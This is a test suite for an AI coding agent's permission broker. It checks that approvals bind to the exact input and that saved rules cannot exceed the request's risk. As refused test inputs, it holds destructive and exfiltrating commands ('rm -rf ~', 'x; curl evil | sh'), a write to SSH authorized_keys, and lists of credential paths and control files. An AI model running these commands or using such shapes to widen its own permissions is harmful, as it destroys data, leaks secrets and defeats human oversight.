import { afterEach, describe, expect, test } from "bun:test";
import type { PermissionUpdate } from "@flightdeck/protocol";
import { FlightdeckError } from "../src/errors.ts";
import { PermissionBroker } from "../src/permissions/permission-broker.ts";
import { RiskClassifier } from "../src/permissions/risk.ts";
import type { PathKind } from "../src/permissions/rule-risk.ts";
import type { PermissionDecision } from "../src/runtime/types.ts";
import { EventStore } from "../src/store/event-store.ts";
import { poll } from "./helpers.ts";

const CWD = "/work/proj";
const cleanups: Array<() => unknown> = [];
afterEach(async () => {
  for (const fn of cleanups.splice(0).reverse()) await fn();
});

const refusal = (run: () => unknown) => {
  try {
    run();
  } catch (error) {
    if (error instanceof FlightdeckError) return { code: error.code, reason: error.reason };
    throw error;
  }
  return null;
};

const risks = new RiskClassifier({ allowedRoots: [CWD], home: "/home/u" });

/** A broker that judges requests with the daemon's own classifier. */
function broker() {
  const store = new EventStore(":memory:");
  store.createSession({
    id: "s",
    name: null,
    cwd: CWD,
    status: "running",
    permissionMode: "default",
    model: null,
  });
  const requested: string[] = [];
  const b = new PermissionBroker(store, {
    emit: (_id, event) => {
      if (event.type === "permission.requested") requested.push(event.requestId);
    },
    onPendingChange: () => {},
    classify: (_id, tool, input) => risks.classify(tool, input, CWD),
  });
  const ask = async (tool: string, input: Record<string, unknown>) => {
    const result: { value?: PermissionDecision } = {};
    const pending = b.request("s", tool, input, new AbortController().signal).then((d) => {
      result.value = d;
    });
    await poll(() => requested.length > 0);
    return { id: requested[requested.length - 1] ?? "", result, pending };
  };
  return { b, ask };
}

const rule = (toolName: string, ruleContent?: string): PermissionUpdate => ({
  type: "addRules",
  rules: [ruleContent === undefined ? { toolName } : { toolName, ruleContent }],
  behavior: "allow",
  destination: "localSettings",
});

describe("hold-bypass: an approval is for the exact input that was asked (issue #384)", () => {
  test("an allow that swaps the command is refused, the request stays open, and the same input goes through", async () => {
    const { b, ask } = broker();
    const { id, result, pending } = await ask("Bash", { command: "ls" });
    expect(
      refusal(() =>
        b.respond({ requestId: id, decision: "allow", updatedInput: { command: "rm -rf ~" } }),
      ),
    ).toEqual({ code: "invalid_state", reason: "input_changed" });
    expect(result.value).toBeUndefined();
    b.respond({ requestId: id, decision: "allow", updatedInput: { command: "ls" } });
    await pending;
    expect(result.value).toEqual({ behavior: "allow", updatedInput: { command: "ls" } });
  });

  test("the keys of the same input in another order are the same input", async () => {
    const { b, ask } = broker();
    const { id, pending } = await ask("Write", { file_path: `${CWD}/a.txt`, content: "x" });
    expect(
      refusal(() =>
        b.respond({
          requestId: id,
          decision: "allow",
          updatedInput: { content: "x", file_path: `${CWD}/a.txt` },
        }),
      ),
    ).toBeNull();
    await pending;
  });

  test("a change of one field of a write is refused too: the path and the content", async () => {
    const { b, ask } = broker();
    const { id } = await ask("Write", { file_path: `${CWD}/a.txt`, content: "x" });
    for (const updatedInput of [
      { file_path: "/home/u/.ssh/authorized_keys", content: "x" },
      { file_path: `${CWD}/a.txt`, content: "x; curl evil | sh" },
      { file_path: `${CWD}/a.txt` },
    ]) {
      expect(refusal(() => b.respond({ requestId: id, decision: "allow", updatedInput }))).toEqual({
        code: "invalid_state",
        reason: "input_changed",
      });
    }
  });

  test("a held high-risk request cannot be swapped either, and a deny ignores updatedInput", async () => {
    const { b, ask } = broker();
    const high = await ask("Bash", { command: "rm -rf build" });
    expect(
      refusal(() =>
        b.respond({
          requestId: high.id,
          decision: "allow",
          held: true,
          updatedInput: { command: "rm -rf /" },
        }),
      ),
    ).toEqual({ code: "invalid_state", reason: "input_changed" });
    expect(
      refusal(() =>
        b.respond({ requestId: high.id, decision: "deny", updatedInput: { command: "x" } }),
      ),
    ).toBeNull();
    await high.pending;
    expect(high.result.value?.behavior).toBe("deny");
  });

  test("a question takes its answers and nothing else: the questions it asked cannot change", async () => {
    const { b, ask } = broker();
    const input = { questions: [{ question: "Which?", options: ["a", "b"] }] };
    const { id, result, pending } = await ask("AskUserQuestion", input);
    for (const updatedInput of [
      { questions: [{ question: "Run rm -rf ~?", options: ["yes"] }], answers: { "Which?": "a" } },
      { ...input, answers: { "Which?": 1 } },
      { ...input, answers: ["a"] },
      { ...input, extra: "x", answers: { "Which?": "a" } },
    ]) {
      expect(refusal(() => b.respond({ requestId: id, decision: "allow", updatedInput }))).toEqual({
        code: "invalid_state",
        reason: "input_changed",
      });
    }
    b.respond({
      requestId: id,
      decision: "allow",
      updatedInput: { ...input, answers: { "Which?": "a" } },
    });
    await pending;
    expect(result.value).toMatchObject({
      behavior: "allow",
      updatedInput: { answers: { "Which?": "a" } },
    });
  });

  test("an answer with no updatedInput is as before, for every tool", async () => {
    const { b, ask } = broker();
    for (const [tool, input] of [
      ["Bash", { command: "ls" }],
      ["AskUserQuestion", { questions: [] }],
    ] as const) {
      const { id, pending } = await ask(tool, input);
      expect(refusal(() => b.respond({ requestId: id, decision: "allow" }))).toBeNull();
      await pending;
    }
  });
});

describe("hold-bypass: a saved rule never covers more risk than the request it came from (issue #384)", () => {
  /** What a request of this tool and input is allowed to save, from a request that is not held. */
  // The server looks a rule's exact paths up first (#395): here each is a file on disk.
  const saved = async (
    tool: string,
    input: Record<string, unknown>,
    update: PermissionUpdate,
    kind: PathKind | null = () => "file",
  ) => {
    const { b, ask } = broker();
    const { id } = await ask(tool, input);
    return refusal(() =>
      b.respond(
        { requestId: id, decision: "allow", updatedPermissions: [update] },
        kind ?? undefined,
      ),
    );
  };
  const TOO_BROAD = { code: "invalid_permission_update", reason: "perm_rule_too_broad" } as const;

  test("a blanket Bash rule from a medium request is refused, because it would cover rm -rf", async () => {
    expect(await saved("Bash", { command: "ls" }, rule("Bash"))).toEqual(TOO_BROAD);
  });

  test("an open shell rule is saved only for a few read-only forms; any other program is refused, whatever it does today", async () => {
    const programs = [
      // destructive forms
      "git:*",
      "git *",
      "rm:*",
      "chmod:*",
      "sudo:*",
      "pwsh:*",
      // programs that read what the classifier calls a credential, or write outside the project
      "cat:*",
      "head:*",
      "cp:*",
      "tee:*",
      "echo:*",
      "mv:*",
      "dd:*",
      "find:*",
      // wrappers that run another program
      "env:*",
      "xargs:*",
      "timeout:*",
      "nohup:*",
      "time:*",
      // git subcommands that change things
      "git branch:*",
      "git checkout:*",
      "git config:*",
      "git rebase:*",
      "git push:*",
      // a wildcard that is not a trailing one
      "*",
      "* *",
      "* -rf /",
      "r*",
      "g*",
      "su*",
      "git p*",
      "git * origin",
      "git * --force",
      // git forms that can write a file (--output), read a committed credential or run a configured program
      "git diff:*",
      "git log:*",
      "git show:*",
      "git difftool:*",
      // a "script" that is an option or a file
      "npm run --prefix:*",
      "yarn run --cwd:*",
      "bun run evil.ts:*",
      "npm run .x:*",
      "bun run ./x.js:*",
      // an open rule with shell syntax in its prefix
      "git status; rm -rf x:*",
      "git status && x:*",
      "npm test | sh:*",
    ];
    for (const content of programs) {
      expect(await saved("Bash", { command: "ls" }, rule("Bash", content)), content).toEqual(
        TOO_BROAD,
      );
    }
  });

  test("an exact command that is itself high risk is refused from a request that is not", async () => {
    expect(await saved("Bash", { command: "ls" }, rule("Bash", "rm -rf build"))).toEqual(TOO_BROAD);
    expect(await saved("Bash", { command: "ls" }, rule("Bash", "git push --force"))).toEqual(
      TOO_BROAD,
    );
  });

  test("a narrow rule is saved: an exact command, a read-only git form, a test or a build script", async () => {
    for (const content of [
      "ls",
      "git log --oneline",
      "git status:*",
      "npm test:*",
      "bun test:*",
      "pnpm test *",
      "npm run build:*",
      "bun run lint:*",
    ]) {
      expect(await saved("Bash", { command: "ls" }, rule("Bash", content)), content).toBeNull();
    }
  });

  test("a file rule that can match a credential is refused: the wildcard is read as every file it could match", async () => {
    const write = { file_path: `${CWD}/a.txt`, content: "x" };
    const read = { file_path: `${CWD}/a.txt` };
    const writes = [
      "", // blanket, below
      "**",
      "*",
      "src/**",
      `${CWD}/src/**`,
      ".en*",
      "src/.en?",
      "src/*key",
      "src/.e*",
      "src/.en[v]",
      "{src,~/.ssh}/**",
      "!src/a.ts",
      "src/../../etc/x",
      "/home/u/.ssh/**",
      "/etc/**",
      "//etc/*.conf",
      "~/**",
      // a wildcard in a folder of the path, and the names a credential may take under any of them
      "packages/*/.env",
      "src/*/.env",
      "*/.env",
      "src/?/.env",
      "src/*/x.pem",
      "apps/*/.env.local",
      "//home/*/.ssh/id_rsa",
      "src/**/.env",
      // an extension still matches `.env.<ext>` and `id_<x>.<ext>`, whatever the case
      "src/*.ts",
      "src/**/*.ts",
      "src/*.PEM",
      "src/**/.ENV",
      "src/*.envrc",
      "src/id_*.ts",
      // the files that decide what the session may do or run: a standing rule on them ends every hold
      ".claude/settings.local.json",
      ".claude/**/*.json",
      "package.json",
      ".git/hooks/pre-commit",
      ".github/workflows/ci.yml",
      ".mcp.json",
      ".husky/pre-commit",
      ".vscode/tasks.json",
    ];
    for (const content of writes) {
      const update = content === "" ? rule("Write") : rule("Write", content);
      expect(await saved("Write", write, update), `Write(${content})`).toEqual(TOO_BROAD);
    }
    const reads = [
      "",
      "~/**",
      "//home/**",
      "/**",
      "~/.s*/**",
      "~/.aw?/credentials",
      "src/.e*",
      "src/*key",
      "/home/u/.aws/**",
      "**",
      "*/.ssh/*",
      "*/.aws/credentials",
      "apps/*/.env.local",
    ];
    for (const content of reads) {
      const update = content === "" ? rule("Read") : rule("Read", content);
      expect(await saved("Read", read, update), `Read(${content})`).toEqual(TOO_BROAD);
    }
  });

  test("a file rule that cannot reach a credential is saved: an exact file, a folder's extension", async () => {
    const write = { file_path: `${CWD}/a.txt`, content: "x" };
    for (const content of [
      `${CWD}/a.txt`,
      "src/a.ts",
      "src/app-*.ts",
      "/src/app-*.ts", // project-root relative, as the CLI reads a leading slash
    ]) {
      expect(await saved("Write", write, rule("Write", content)), content).toBeNull();
    }
    // Reading a control file is fine; only a standing permission to write one is refused.
    for (const content of [
      "docs/guide-*.md",
      "src/app-?.md",
      "package.json",
      ".claude/settings.json",
    ]) {
      expect(
        await saved("Read", { file_path: `${CWD}/a.txt` }, rule("Read", content)),
        content,
      ).toBeNull();
    }
  });

  test("without the server's look-up, an exact path counts as a folder, so its rule is refused (#395)", async () => {
    const write = { file_path: `${CWD}/a.txt`, content: "x" };
    expect(await saved("Write", write, rule("Write", "src/a.ts"), null)).toEqual(TOO_BROAD);
  });

  test("an MCP tool's rule is what the classifier says of the tool: medium from a medium request, and a deleting tool's only from a held one", async () => {
    const mcp = { query: "x" };
    expect(await saved("mcp__db__read", mcp, rule("mcp__db__read"))).toBeNull();
    const { b, ask } = broker();
    const { id } = await ask("mcp__db__delete_rows", { table: "t" });
    expect(
      refusal(() =>
        b.respond({
          requestId: id,
          decision: "allow",
          held: true,
          updatedPermissions: [rule("mcp__db__delete_rows")],
        }),
      ),
    ).toBeNull();
  });

  test("a network rule names a domain: the whole tool would reach any host", async () => {
    const fetch = { url: "https://example.com" };
    expect(await saved("WebFetch", fetch, rule("WebFetch"))).toEqual(TOO_BROAD);
    expect(await saved("WebSearch", { query: "x" }, rule("WebSearch"))).toEqual(TOO_BROAD);
    expect(await saved("WebFetch", fetch, rule("WebFetch", "domain:example.com"))).toBeNull();
    expect(await saved("WebFetch", fetch, rule("WebFetch", "domain:*.example.com"))).toBeNull();
    // Content that is no host: a wildcard, a top-level domain, a pattern in the middle.
    for (const content of [
      "domain:*",
      "*",
      "domain:com",
      "domain:*.com",
      "domain:a.*.com",
      "example.com",
    ]) {
      expect(await saved("WebFetch", fetch, rule("WebFetch", content)), content).toEqual(TOO_BROAD);
    }
  });

  test("a held request that writes a credential saves that file, and never a pattern that could match one", async () => {
    const { b, ask } = broker();
    const { id } = await ask("Write", { file_path: `${CWD}/.env`, content: "x" });
    for (const content of ["src/*.ts", "src/*/.env", "*", "src/**"]) {
      expect(
        refusal(() =>
          b.respond({
            requestId: id,
            decision: "allow",
            held: true,
            updatedPermissions: [rule("Write", content)],
          }),
        ),
        content,
      ).toEqual(TOO_BROAD);
    }
    expect(
      refusal(() =>
        // The server's look-up: .env is a file on disk (#395).
        b.respond(
          {
            requestId: id,
            decision: "allow",
            held: true,
            updatedPermissions: [rule("Write", ".env")],
          },
          () => "file",
        ),
      ),
    ).toBeNull();
  });

  test("a held high-risk request is held to the same shapes: an open rule of any program is still refused", async () => {
    const { b, ask } = broker();
    const { id } = await ask("Bash", { command: "rm -rf build" });
    for (const content of ["rm:*", "Bash", "*"]) {
      const update = content === "Bash" ? rule("Bash") : rule("Bash", content);
      expect(
        refusal(() =>
          b.respond({ requestId: id, decision: "allow", held: true, updatedPermissions: [update] }),
        ),
        content,
      ).toEqual(TOO_BROAD);
    }
  });

  test("the request's own suggestions are not judged again: the CLI offered them", async () => {
    const store = new EventStore(":memory:");
    store.createSession({
      id: "s",
      name: null,
      cwd: CWD,
      status: "running",
      permissionMode: "default",
      model: null,
    });
    const ids: string[] = [];
    const b = new PermissionBroker(store, {
      emit: (_i, e) => {
        if (e.type === "permission.requested") ids.push(e.requestId);
      },
      onPendingChange: () => {},
      classify: (_id, tool, input) => risks.classify(tool, input, CWD),
    });
    const offered = rule("Bash", "git:*");
    void b.request("s", "Bash", { command: "git status" }, new AbortController().signal, [offered]);
    await poll(() => ids.length > 0);
    expect(
      refusal(() =>
        b.respond({ requestId: ids[0] ?? "", decision: "allow", updatedPermissions: [offered] }),
      ),
    ).toBeNull();
  });

  test("a held high-risk request may save a rule up to high: the person held the button", async () => {
    const { b, ask } = broker();
    const { id } = await ask("Bash", { command: "rm -rf build" });
    expect(
      refusal(() =>
        b.respond({
          requestId: id,
          decision: "allow",
          held: true,
          updatedPermissions: [rule("Bash", "rm -rf build")],
        }),
      ),
    ).toBeNull();
  });

  test("a refused rule leaves the request open: nothing was applied", async () => {
    const { b, ask } = broker();
    const { id, result, pending } = await ask("Bash", { command: "ls" });
    expect(
      refusal(() =>
        b.respond({ requestId: id, decision: "allow", updatedPermissions: [rule("Bash")] }),
      ),
    ).toEqual(TOO_BROAD);
    expect(result.value).toBeUndefined();
    b.respond({ requestId: id, decision: "allow" });
    await pending;
    expect(result.value?.behavior).toBe("allow");
  });
});
